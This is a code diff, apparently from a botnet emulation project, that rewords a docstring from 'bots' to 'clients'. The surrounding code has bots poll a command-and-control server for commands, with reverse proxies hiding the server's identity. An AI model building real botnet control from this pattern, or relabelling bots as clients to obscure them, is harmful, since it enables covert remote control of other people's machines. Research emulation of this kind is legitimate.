@@ -30,9 +30,9 @@ class Bot(CommandExecutor):
                 logging.debug("Duty of bot %s failed with %s: %s" % (self.name, type(ex).__name__, ex))
 
     def _fetchCurrentCommand(self, cncserver):
-        """Fetches a command from the CnC-Server and executes. This way the Botmaster can control the bots.
+        """Fetches a command from the CnC-Server and executes. This way the Botmaster can control the clients.
         The CnC-Server does not need to keep track of their addresses because they pull from it and reverse proxies
-        can be used, so that the bots do not need to know the identity of the CnC-Server. """
+        can be used, so that the clients do not need to know the identity of the CnC-Server. """
 
         response = requests.get("http://%s:%s/current_command" % (cncserver, emu_config.PORT),
                                 headers={"Accept": "application/json"})
